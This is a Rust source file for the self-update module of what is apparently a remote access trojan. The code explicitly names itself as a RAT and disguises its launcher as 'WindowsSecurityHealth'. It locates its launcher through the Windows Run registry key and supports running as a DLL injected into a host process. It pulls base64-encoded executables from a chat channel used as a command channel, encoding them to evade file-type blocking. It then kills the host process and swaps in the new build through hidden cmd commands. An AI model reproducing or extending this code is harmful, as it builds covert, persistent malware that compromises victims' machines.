// language: Rust, file: src/update.rs, target: Windows
// Self-update that works both standalone and injected.
//
//   exe mode : replace <current_exe> and relaunch it
//   dll mode : replace the loaded module file, kill the host, relaunch the launcher
//              (which re-injects the new DLL)
//
// Stoat blocks executables by MIME, so payloads ride as base64 text. The channel may hold
// both exe and dll payloads; the updater picks the one matching the current mode.
#![allow(dead_code)]
use anyhow::{bail, Context, Result};
use base64::Engine;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;

use crate::config::Config;
use crate::stoat::Stoat;
use crate::workspace::{self, Workspace};

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

/// Path of the file this code was loaded from (the exe, or the injected DLL).
#[cfg(windows)]
pub fn self_module_path() -> PathBuf {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;
    use windows_sys::Win32::System::LibraryLoader::{GetModuleFileNameW, GetModuleHandleExW};
    const FROM_ADDRESS: u32 = 0x0000_0004;
    const UNCHANGED: u32 = 0x0000_0002;

    unsafe extern "system" fn anchor() {}
    unsafe {
        let mut hmod = std::ptr::null_mut();
        let addr = anchor as *const () as usize as *const u16;
        if GetModuleHandleExW(FROM_ADDRESS | UNCHANGED, addr, &mut hmod) == 0 {
            return std::env::current_exe().unwrap_or_default();
        }
        let mut buf = vec![0u16; 32768];
        let n = GetModuleFileNameW(hmod, buf.as_mut_ptr(), buf.len() as u32);
        if n == 0 {
            return std::env::current_exe().unwrap_or_default();
        }
        buf.truncate(n as usize);
        PathBuf::from(OsString::from_wide(&buf))
    }
}

#[cfg(not(windows))]
pub fn self_module_path() -> PathBuf {
    std::env::current_exe().unwrap_or_default()
}

/// True when running inside a host process (module file != current exe).
pub fn is_injected() -> bool {
    let m = self_module_path().canonicalize().unwrap_or_else(|_| self_module_path());
    let c = std::env::current_exe()
        .unwrap_or_default()
        .canonicalize()
        .unwrap_or_default();
    m != c
}

/// The launcher exe that re-injects the DLL: read from the Run key, else the default path.
#[cfg(windows)]
fn launcher_path() -> PathBuf {
    use winreg::enums::HKEY_CURRENT_USER;
    use winreg::RegKey;
    let rat_name = std::env::var("RAT_NAME").ok();
    let run_name = rat_name.clone().unwrap_or_else(|| "WindowsSecurityHealth".into());
    let launcher_file = rat_name.unwrap_or_else(|| "WindowsSecurityHealth.exe".into());

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(key) = hkcu.open_subkey(r"Software\Microsoft\Windows\CurrentVersion\Run") {
        if let Ok(v) = key.get_value::<String, _>(&run_name) {
            if !v.is_empty() {
                return PathBuf::from(v);
            }
        }
    }
    let dir = std::env::var("RAT_DESTDIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| {
            PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
                .join("Microsoft")
                .join("Windows")
        });
    dir.join(launcher_file)
}

/// Is this PE a DLL? None if not a parseable PE.
fn pe_is_dll(b: &[u8]) -> Option<bool> {
    if b.len() < 0x40 || b.get(..2) != Some(b"MZ") {
        return None;
    }
    let pe = u32::from_le_bytes([b[0x3C], b[0x3D], b[0x3E], b[0x3F]]) as usize;
    if pe + 24 > b.len() || &b[pe..pe + 4] != b"PE\0\0" {
        return None;
    }
    let characteristics = u16::from_le_bytes([b[pe + 4 + 18], b[pe + 4 + 19]]);
    Some(characteristics & 0x2000 != 0) // IMAGE_FILE_DLL
}

fn decode_payload(raw: &[u8]) -> Option<Vec<u8>> {
    if raw.get(..2) == Some(b"MZ") {
        return Some(raw.to_vec());
    }
    let text: String = std::str::from_utf8(raw)
        .ok()?
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect();
    base64::engine::general_purpose::STANDARD.decode(text).ok()
}

/// Stage the newest matching build from the update channel as `<module>.new`.
/// Returns a label when a different build was staged.
pub async fn stage(st: &Stoat, cfg: &Config, ws: &Workspace) -> Result<Option<String>> {
    let update_ch = match &cfg.update_channel {
        Some(c) if !c.is_empty() => c.clone(),
        _ => workspace::find_channel_by_name(st, &ws.server, "update")
            .await?
            .context("no channel named 'update' in this server")?,
    };

    let page = st
        .get_json(&format!("/channels/{update_ch}/messages?limit=50"))
        .await?;
    let msgs = page.as_array().cloned().unwrap_or_default();

    let mut cands: Vec<(String, String, String, String)> = Vec::new();
    for m in &msgs {
        let mid = m["_id"].as_str().unwrap_or("").to_string();
        if let Some(atts) = m["attachments"].as_array() {
            for a in atts {
                let id = a["_id"].as_str().unwrap_or("");
                if !id.is_empty() {
                    cands.push((
                        mid.clone(),
                        a["tag"].as_str().unwrap_or("attachments").to_string(),
                        id.to_string(),
                        a["filename"].as_str().unwrap_or("payload").to_string(),
                    ));
                }
            }
        }
    }
    cands.sort_by(|a, b| b.0.cmp(&a.0)); // newest first

    if cands.is_empty() {
        bail!("no attachments in the update channel");
    }

    let module = self_module_path();
    let want_dll = is_injected();
    let current = std::fs::read(&module).ok();

    for (_, tag, id, fname) in cands {
        let raw = st.download(&tag, &id).await?;
        let Some(bytes) = decode_payload(&raw) else {
            continue;
        };
        if bytes.len() < 1024 {
            continue;
        }
        // Only accept a payload matching this install's mode.
        match pe_is_dll(&bytes) {
            Some(dll) if dll == want_dll => {}
            _ => continue,
        }
        if current.as_deref() == Some(bytes.as_slice()) {
            return Ok(None);
        }
        let staged = PathBuf::from(format!("{}.new", module.display()));
        std::fs::write(&staged, &bytes)?;
        return Ok(Some(format!("{fname} ({} bytes)", bytes.len())));
    }
    bail!(
        "no matching {} build in the update channel",
        if want_dll { "DLL" } else { "EXE" }
    );
}

/// Apply the staged build and restart.
pub fn relaunch_and_exit() -> Result<()> {
    let module = self_module_path();
    let staged = PathBuf::from(format!("{}.new", module.display()));
    if !staged.exists() {
        bail!("no staged build");
    }
    let pid = std::process::id();

    if is_injected() {
        // Kill the host (releases the DLL lock), swap the file, relaunch the launcher.
        let launcher = launcher_path();
        let cmd = format!(
            "/C taskkill /F /PID {pid} >nul 2>&1 & ping -n 3 127.0.0.1 >nul & move /Y \"{}\" \"{}\" & start \"\" \"{}\"",
            staged.display(),
            module.display(),
            launcher.display()
        );
        std::process::Command::new("cmd")
            .raw_arg(cmd)
            .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
            .spawn()?;
    } else {
        let old = PathBuf::from(format!("{}.old", module.display()));
        let _ = std::fs::remove_file(&old);
        std::fs::rename(&module, &old).context("rename running exe")?;
        std::fs::rename(&staged, &module).context("move staged build into place")?;
        let cmd = format!(
            "/C ping -n 3 127.0.0.1 >nul & start \"\" \"{}\"",
            module.display()
        );
        std::process::Command::new("cmd")
            .raw_arg(cmd)
            .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
            .spawn()?;
    }
    Ok(())
}
